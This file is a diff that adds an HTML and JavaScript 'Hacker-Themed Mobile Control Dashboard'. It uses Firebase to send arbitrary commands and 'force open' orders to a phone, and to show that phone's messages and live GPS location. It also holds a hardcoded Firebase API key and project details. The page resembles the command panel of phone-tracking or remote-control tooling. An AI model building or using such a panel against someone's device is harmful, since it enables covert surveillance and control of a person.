@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Hacker-Themed Mobile Control</title>
+  <link rel="stylesheet" href="index.css" />
+</head>
+<body>
+  <div id="container">
+    <header>Hacker-Themed Mobile Control Dashboard</header>
+
+    <div id="screen" class="box">
+      <img id="liveScreen" src="placeholder.png" alt="Live Screen" />
+    </div>
+
+    <div id="controls">
+      <div class="box">
+        <div>Command:</div>
+        <input id="commandInput" placeholder="Enter command..." />
+        <button id="sendCommand">Send</button>
+        <button id="forceOpen">Force Open App</button>
+      </div>
+      <div id="messages" class="box">
+        <div><strong>Live Messages:</strong></div>
+        <div id="messageLog">Connecting...</div>
+      </div>
+      <div id="location" class="box">
+        <div><strong>Location:</strong></div>
+        <div id="locationCoords">Lat: --, Lon: --</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    // Replace with your actual Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyCB5iqCRZYKzdn4AkHhUemkx2kwEGMWp3k",
+      authDomain: "phonecontrol-250208.firebaseapp.com",
+      databaseURL: "https://phonecontrol-250208-default-rtdb.firebaseio.com",
+      projectId: "phonecontrol-250208",
+      storageBucket: "phonecontrol-250208.appspot.com",
+      messagingSenderId: "428817953538",
+      appId: "1:428817953538:web:c9e081e01a92c7e642881b"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // References
+    const commandRef = database.ref('/commands/device_001');
+    const messagesRef = database.ref('/messages/device_001');
+    const locationRef = database.ref('/location/device_001');
+
+    const messageLog = document.getElementById('messageLog');
+    const locationCoords = document.getElementById('locationCoords');
+    const liveScreen = document.getElementById('liveScreen');
+
+    // Listen commands
+    commandRef.on('value', snapshot => {
+      const cmd = snapshot.val();
+      if (cmd) {
+        const entry = document.createElement('div');
+        entry.textContent = `Command received: ${JSON.stringify(cmd)}`;
+        messageLog.appendChild(entry);
+        scrollBottom(messageLog);
+      }
+    });
+
+    // Listen messages
+    messagesRef.on('child_added', snapshot => {
+      const msg = snapshot.val();
+      if (msg) {
+        const entry = document.createElement('div');
+        entry.textContent = `Message: ${msg}`;
+        messageLog.appendChild(entry);
+        scrollBottom(messageLog);
+      }
+    });
+
+    // Location updates
+    locationRef.on('value', snapshot => {
+      const loc = snapshot.val();
+      if (loc && loc.lat && loc.lon) {
+        locationCoords.textContent = `Lat: ${loc.lat}, Lon: ${loc.lon}`;
+      }
+    });
+
+    // Send commands
+    document.getElementById('sendCommand').onclick = () => {
+      const cmd = document.getElementById('commandInput').value.trim();
+      if (!cmd) return;
+
+      commandRef.set({ action: cmd, timestamp: Date.now() }).then(() => {
+        const entry = document.createElement('div');
+        entry.textContent = `Sent command: ${cmd}`;
+        messageLog.appendChild(entry);
+        scrollBottom(messageLog);
+        document.getElementById('commandInput').value = '';
+      });
+    };
+
+    document.getElementById('forceOpen').onclick = () => {
+      commandRef.set({ action: 'force_open', timestamp: Date.now() }).then(() => {
+        const entry = document.createElement('div');
+        entry.textContent = 'Sent command: FORCE OPEN APP';
+        messageLog.appendChild(entry);
+        scrollBottom(messageLog);
+      });
+    };
+
+    // Scroll helper
+    function scrollBottom(el) {
+      el.scrollTop = el.scrollHeight;
+    }
+
+    // Optional: update live screen placeholder image periodically
+    setInterval(() => {
+      const rnd = Math.floor(Math.random() * 5) + 1;
+      liveScreen.src = `placeholder${rnd}.png`;
+    }, 10000);
+  </script>
+</body>
+</html>
